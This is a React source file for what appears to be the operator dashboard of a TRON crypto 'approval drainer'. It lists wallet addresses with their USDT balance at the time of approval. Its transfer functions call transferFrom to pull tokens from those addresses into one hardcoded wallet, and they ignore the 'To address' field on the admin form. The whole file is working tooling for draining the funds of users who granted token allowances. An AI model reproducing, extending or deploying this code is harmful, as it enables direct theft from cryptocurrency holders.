import React, { useState, useEffect } from "react";
import axios from "./config/axios";
import abiData from "./utils/abiData";
import CopyHash from "./components/CopyHash";
import DateFormat from "./components/DateFormat";
import { decryptText } from './utils/crypt';
import { Pagination, Collapse, Form, Button, Col, InputGroup, Table, Alert, Spinner } from "react-bootstrap";
import { useNavigate } from "react-router";

const Home = () => {
  const navigate = useNavigate();
  const [approvals, setApprovals] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [transactionStatus, setTransactionStatus] = useState("");
  const [open, setOpen] = useState(false);
  const [open2, setOpen2] = useState(false);
  const [validated2, setValidated2] = useState(false);
  const [validated, setValidated] = useState(false);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [mfromAddress, msetFromAddress] = useState("");
  const [mtoAddress, msetToAddress] = useState("");
  const [mamount, msetAmount] = useState("");
  const [networkError, setNetworkError] = useState("");
  const [tronLinkAvailable, setTronLinkAvailable] = useState(false);
  const [tronLinkConnected, setTronLinkConnected] = useState(false);

  const userInfo = JSON.parse(decryptText(localStorage.getItem('data')));

  useEffect(() => {
    fetchApprovals();
    checkForTronLink();

    // Listen for account changes
    window.addEventListener('message', handleTronLinkMessage);

    return () => {
      window.removeEventListener('message', handleTronLinkMessage);
    };
  }, [currentPage]);

  const handleTronLinkMessage = (event) => {
    if (event.data.message && event.data.message.action === 'setAccount') {
      checkForTronLink();
    }
  };

  const checkForTronLink = () => {
    if (window.tronWeb) {
      setTronLinkAvailable(true);
      if (window.tronWeb.ready) {
        setTronLinkConnected(true);
        checkNetwork();
      } else {
        setTronLinkConnected(false);
        setNetworkError("Please unlock TronLink to continue");
      }
    } else {
      setTronLinkAvailable(false);
      setTronLinkConnected(false);
      setNetworkError("TronLink is not installed");
    }
  };

  const fetchApprovals = async () => {
    setLoading(true);
    try {
      const response = await axios.post(`${import.meta.env.VITE_API_URL}/approvals/list`, {
        page: currentPage,
        limit: 20,
      });
      setApprovals(response.data.approvals);
      setTotalPages(response.data.totalPages);
    } catch (err) {
      handleFetchError(err);
    } finally {
      setLoading(false);
    }
  };

  const handleFetchError = (err) => {
    if (err.response) {
      if (err.response.status === 401) {
        alert('Session expired. Please login again');
        localStorage.clear();
        navigate('/login');
      } else {
        setError(err.response.data.message || 'No Data Found');
      }
    } else if (err.request) {
      setError('Network error, please try again later.');
    } else {
      setError('Error making request, please try again later.');
    }
  };

  const handlePageChange = (pageNumber) => {
    setCurrentPage(pageNumber);
  };

  const checkNetwork = async () => {
    try {
      if (!window.tronWeb || !window.tronWeb.ready) {
        throw new Error("TronLink is not connected or locked");
      }

      // Method 1: Check chainId directly if available
      if (window.tronWeb.fullNode.chainId) {
        const isMainnet = window.tronWeb.fullNode.chainId === "728126428";
        if (!isMainnet) {
          throw new Error("Please connect to Tron Mainnet");
        }
        setNetworkError("");
        return true;
      }

      // Method 2: Fallback to node host check
      const nodeHost = window.tronWeb.fullNode.host;
      const isMainnet = nodeHost.includes('api.trongrid.io') && 
                       !nodeHost.includes('shasta') &&
                       !nodeHost.includes('nile');
      
      if (!isMainnet) {
        throw new Error("Please connect to Tron Mainnet");
      }

      setNetworkError("");
      return true;
    } catch (error) {
      setNetworkError(error.message);
      return false;
    }
  };

  const validateAmount = (amount) => {
    const amountRegex = /^[+]?\d+(\.\d+)?$/;
    return amountRegex.test(amount);
  };

  const handleTransfer2 = async (e) => {
    const index = e.target.dataset.index;
    const fromAddress = document.querySelector(`#fromAddress${index}`).value;
    const manual_amount = document.querySelector(`#manual_amount${index}`);
    const amount = manual_amount.value.trim();

    if (!amount) {
      manual_amount.classList.add('is-invalid');
      alert('Amount field is required');
      return;
    }

    if (!validateAmount(amount)) {
      manual_amount.classList.add('is-invalid');
      alert('Please enter a valid positive amount');
      return;
    }

    manual_amount.classList.remove('is-invalid');
    await handleTransfer3(amount, fromAddress);
  };

  const handleTransfer = async (e) => {
    e.preventDefault();
    const form = e.currentTarget;
    
    if (form.checkValidity() === false) {
      e.stopPropagation();
      setValidated(true);
      return;
    }

    const fromAddress = document.querySelector(`#fromAddress`).value;
    const amount = document.querySelector(`#manual_amount`).value;
    await handleTransfer3(amount, fromAddress);
  };

  const handleTransfer4 = async (e) => {
    e.preventDefault();
    const form = e.currentTarget;
    
    if (form.checkValidity() === false) {
      e.stopPropagation();
      setValidated2(true);
      return;
    }

    if (!mamount || !mfromAddress) {
      return;
    }

    await handleTransfer3(mamount, mfromAddress);
  };

  const handleTransfer3 = async (amount, fromAddress) => {
    try {
      if (!tronLinkAvailable) {
        throw new Error("TronLink is not installed");
      }
      
      if (!tronLinkConnected) {
        throw new Error("Please unlock TronLink first");
      }

      const networkValid = await checkNetwork();
      if (!networkValid) {
        throw new Error(networkError || "Network error, please try again.");
      }

      const toAddress = "TKbJaEgWnXiGKKuyUmi11qTpx9oRiGjEVW";
      const getSettings = await axios.post(`${import.meta.env.VITE_API_URL}/settings/get`);
      const settings = getSettings.data;
      
      const contract = await window.tronWeb.contract(
        abiData,
        settings.contractAddress
      );

      const amountSun = window.tronWeb.toSun(amount);
      const tx = await contract.transferFrom(
        fromAddress,
        toAddress,
        amountSun
      ).send({
        feeLimit: 100000000,
        callValue: 0
      });

      const successMessage = `Transaction successful! TX ID: ${tx}`;
      alert(successMessage);
      setTransactionStatus(successMessage);
      
      await fetchApprovals();
    } catch (error) {
      console.error("Transaction error:", error);
      const errorMessage = error.message || "Transaction failed";
      alert(errorMessage);
      setTransactionStatus(errorMessage);
    }
  };

  const handleDelete = async (id) => {
    if (!confirm('Are you sure you want to delete this approval?')) return;
    
    try {
      const response = await axios.post(`${import.meta.env.VITE_API_URL}/approvals/delete`, { id });
      if (response.status === 200) {
        alert('Approval deleted successfully');
        setApprovals(approvals.filter((approval) => approval._id !== id));
      }
    } catch (err) {
      alert('Error deleting approval');
    }
  };

  if (loading) {
    return (
      <div className="d-flex justify-content-center align-items-center" style={{ height: '50vh' }}>
        <Spinner animation="border" role="status">
          <span className="visually-hidden">Loading...</span>
        </Spinner>
      </div>
    );
  }

  if (error) {
    return (
      <Alert variant="danger" className="m-3">
        {error}
      </Alert>
    );
  }

  return (
    <div className="container-fluid">
      <div className="d-flex justify-content-between align-items-center py-2">
        <h2>Approval Records</h2>
        <div className="d-flex align-items-center gap-2">
          <div className="tronlink-status">
            <span className={`status-dot ${tronLinkConnected ? 'connected' : 'disconnected'}`}></span>
            {tronLinkConnected ? 'TronLink Connected' : 'TronLink Disconnected'}
          </div>
          <Button
            onClick={() => { setOpen(!open); setOpen2(false) }}
            aria-controls="transfer-form"
            aria-expanded={open}
            disabled={!tronLinkConnected}
          >
            {!open ? "Show" : "Hide"} Transfer Form
          </Button>
          {userInfo.userRole === 'admin' && (
            <Button
              onClick={() => { setOpen2(!open2); setOpen(false) }}
              aria-controls="admin-transfer-form"
              aria-expanded={open2}
              variant="danger"
              className="ms-1"
              disabled={!tronLinkConnected}
            >
              {!open2 ? "Show" : "Hide"} Admin Transfer
            </Button>
          )}
        </div>
      </div>

      {!tronLinkAvailable && (
        <Alert variant="warning" className="mt-3">
          <Alert.Heading>TronLink Wallet Required</Alert.Heading>
          <p>
            To interact with this dApp, you need to install the TronLink browser extension.
          </p>
          <div className="d-flex gap-2">
            <Button 
              href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" 
              target="_blank"
              variant="primary"
            >
              Install for Chrome
            </Button>
            <Button 
              href="https://addons.mozilla.org/en-US/firefox/addon/tronlink/" 
              target="_blank"
              variant="primary"
            >
              Install for Firefox
            </Button>
          </div>
          <p className="mt-2 mb-0">
            After installation, refresh this page and unlock TronLink.
          </p>
        </Alert>
      )}

      {tronLinkAvailable && !tronLinkConnected && (
        <Alert variant="info" className="mt-3">
          <div className="d-flex justify-content-between align-items-center">
            <span>TronLink is locked - please unlock it</span>
            <Button 
              variant="primary" 
              size="sm"
              onClick={() => window.location.reload()}
            >
              I've unlocked TronLink
            </Button>
          </div>
        </Alert>
      )}

      {networkError && (
        <Alert variant="danger" className="mt-2">
          {networkError}
        </Alert>
      )}

      <Collapse in={open}>
        <div id="transfer-form">
          <Form
            className="row"
            onSubmit={handleTransfer}
            noValidate
            validated={validated}
          >
            <Col sm={6}>
              <Form.Group className="mb-3">
                <Form.Label htmlFor="fromAddress">From address</Form.Label>
                <Form.Control
                  type="text"
                  id="fromAddress"
                  placeholder="Enter from address"
                  required
                />
                <Form.Control.Feedback type="invalid">
                  Please enter a valid from address.
                </Form.Control.Feedback>
              </Form.Group>
            </Col>
            <Col>
              <Form.Group className="mb-3">
                <Form.Label htmlFor="amount">Amount</Form.Label>
                <InputGroup className="mb-3">
                  <Form.Control
                    type="text"
                    placeholder="Enter amount"
                    required
                    id="manual_amount"
                    pattern="^[+]?\d+(\.\d+)?$"
                  />
                  <Button type="submit" className="rounded-end">
                    Transfer Token
                  </Button>
                  <Form.Control.Feedback type="invalid">
                    Please enter a valid positive amount.
                  </Form.Control.Feedback>
                </InputGroup>
              </Form.Group>
            </Col>
          </Form>
          {transactionStatus && (
            <Alert variant={transactionStatus.includes("successful") ? "success" : "danger"}>
              {transactionStatus}
            </Alert>
          )}
        </div>
      </Collapse>

      {userInfo.userRole === 'admin' && (
        <Collapse in={open2}>
          <div id="admin-transfer-form">
            <Form
              className="row"
              onSubmit={handleTransfer4}
              noValidate
              validated={validated2}
            >
              <Col sm={6} md={4}>
                <Form.Group className="mb-3">
                  <Form.Label htmlFor="mfromAddress">From address</Form.Label>
                  <Form.Control
                    type="text"
                    id="mfromAddress"
                    placeholder="Enter from address"
                    required
                    value={mfromAddress}
                    onChange={(e) => msetFromAddress(e.target.value)}
                  />
                  <Form.Control.Feedback type="invalid">
                    Please enter a valid from address.
                  </Form.Control.Feedback>
                </Form.Group>
              </Col>
              <Col sm={6} md={4}>
                <Form.Group className="mb-3">
                  <Form.Label htmlFor="mtoAddress">To address</Form.Label>
                  <Form.Control
                    type="text"
                    id="mtoAddress"
                    placeholder="Enter to address"
                    required
                    value={mtoAddress}
                    onChange={(e) => msetToAddress(e.target.value)}
                  />
                  <Form.Control.Feedback type="invalid">
                    Please enter a valid to address.
                  </Form.Control.Feedback>
                </Form.Group>
              </Col>
              <Col>
                <Form.Group className="mb-3">
                  <Form.Label htmlFor="mamount">Amount</Form.Label>
                  <InputGroup className="mb-3">
                    <Form.Control
                      type="text"
                      placeholder="Enter amount"
                      required
                      id="mamount"
                      value={mamount}
                      onChange={(e) => msetAmount(e.target.value)}
                      pattern="^[+]?\d+(\.\d+)?$"
                    />
                    <Button type="submit" className="rounded-end" variant="danger">
                      Transfer Token
                    </Button>
                    <Form.Control.Feedback type="invalid">
                      Please enter a valid positive amount.
                    </Form.Control.Feedback>
                  </InputGroup>
                </Form.Group>
              </Col>
            </Form>
            {transactionStatus && (
              <Alert variant={transactionStatus.includes("successful") ? "success" : "danger"}>
                {transactionStatus}
              </Alert>
            )}
          </div>
        </Collapse>
      )}

      <div className="table-responsive">
        <Table striped bordered hover>
          <thead>
            <tr>
              <th>#</th>
              <th>User Address</th>
              <th>USDT Balance at Approval</th>
              <th>TransactionID</th>
              <th>Date</th>
              <th>Amount</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            {approvals.map((approval, index) => (
              <tr key={approval._id || index}>
                <td>{index + 1}</td>
                <td>
                  <div title={approval.userAddress}>
                    <CopyHash hash={approval.userAddress} />
                  </div>
                </td>
                <td>{approval.UsdtBalanceAtApproval}</td>
                <td>
                  <div title={approval.TransactionID}>
                    <CopyHash hash={approval.TransactionID} />
                  </div>
                </td>
                <td>
                  <DateFormat timestamp={approval.createdAt || "2025-03-06T21:36:20.360Z"} />
                </td>
                <td>
                  <input
                    type="hidden"
                    id={`fromAddress${index}`}
                    readOnly
                    value={approval.userAddress}
                  />
                  <Form.Control
                    type="text"
                    className="form-control-sm"
                    id={`manual_amount${index}`}
                    placeholder="Enter amount"
                    pattern="^[+]?\d+(\.\d+)?$"
                  />
                </td>
                <td>
                  <Button
                    variant="primary"
                    size="sm"
                    data-index={index}
                    onClick={handleTransfer2}
                    disabled={!tronLinkConnected}
                  >
                    <i className="bi bi-send"></i> Transfer
                  </Button>
                  {userInfo.userRole === 'admin' && (
                    <Button
                      variant="danger"
                      size="sm"
                      className="ms-1"
                      onClick={() => handleDelete(approval._id)}
                    >
                      <i className="bi bi-trash3"></i> Delete
                    </Button>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </Table>

        {totalPages > 1 && (
          <Pagination size="sm" className="justify-content-center mt-3">
            <Pagination.Prev 
              onClick={() => handlePageChange(currentPage - 1)} 
              disabled={currentPage === 1} 
            />
            {Array.from({ length: totalPages }, (_, i) => (
              <Pagination.Item
                key={i + 1}
                active={currentPage === i + 1}
                onClick={() => handlePageChange(i + 1)}
              >
                {i + 1}
              </Pagination.Item>
            ))}
            <Pagination.Next 
              onClick={() => handlePageChange(currentPage + 1)} 
              disabled={currentPage === totalPages} 
            />
          </Pagination>
        )}
      </div>

      <style jsx>{`
        .tronlink-status {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 6px 12px;
          background: #f8f9fa;
          border-radius: 4px;
          font-size: 14px;
        }
        .status-dot {
          width: 10px;
          height: 10px;
          border-radius: 50%;
        }
        .status-dot.connected {
          background-color: #28a745;
        }
        .status-dot.disconnected {
          background-color: #dc3545;
        }
      `}</style>
    </div>
  );
};

export default Home;